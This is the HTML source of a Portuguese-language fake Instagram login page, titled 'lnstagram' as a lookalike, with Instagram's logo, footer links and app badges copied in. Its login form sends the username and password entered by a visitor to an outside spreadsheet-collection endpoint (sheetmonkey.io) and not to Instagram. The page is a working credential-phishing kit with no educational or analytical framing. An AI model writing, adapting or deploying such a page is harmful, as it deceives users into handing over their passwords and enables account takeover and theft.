<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="Icon" type="image/x-icon"
    href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>lnstagram</title>
  
</head>

<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css.css">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form action="https://api.sheetmonkey.io/form/vedud9LP1aecXyaWgQBhQQ" method="post">
                    
                    <div class="input-box">
                      <input placeholder="Telefone, nome de usuario ou email" type="text" id="username" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="Name" required>
                    </div>

                    <div class="input-box">
                      <input type="password" name="Email" id="password" placeholder="Senha" maxlength="30"
                        aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>

                    <span class="button-box">
                      <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time"/>
  <input class="btn" name="submit" type="submit" value="Entrar"/>
                    </span>

                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Esqueceu a Senha?</a>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->
              <div class="login-box">
                <p class="text">Não tem uma conta?<a href="https://www.instagram.com/accounts/emailsignup">Cadastre-se</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Obtenha o aplicativo.</p>
                <div class="app-img">
                  <a
                    href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img
                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
                  </a>
                  <a
                    href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img
                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>
                </div> <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="https://about.meta.com/">Meta</a></li>
              <li><a href="https://about.instagram.com">Sobre</a></li>
              <li><a href="https://help.instagram.com">Suporte</a></li>
              <li><a href="https://about.instagram.com/blog">Blog</a></li>
              <li><a href="https://about.instagram.com/about-us/careers">Carreira</a></li>
              <li><a href="https://www.instagram.com/developer">Api</a></li>
              <li><a href="https://help.instagram.com/519522125107875">Privacidade</a></li>
              <li><a href="https://help.instagram.com/581066165581870">Termos</a></li>
              <li><a href="https://www.instagram.com/explore/locations/">Localizações</a></li>
              <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
              <li><a href="https://www.threads.net/">Threads</a></li>
              <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; Instagram 2023</span>
        </div> <!-- Footer container end -->
      </footer>

    </section>
  </span> <!-- Root -->

  <!-- Select Link -->
  </form>
</body>
</html>
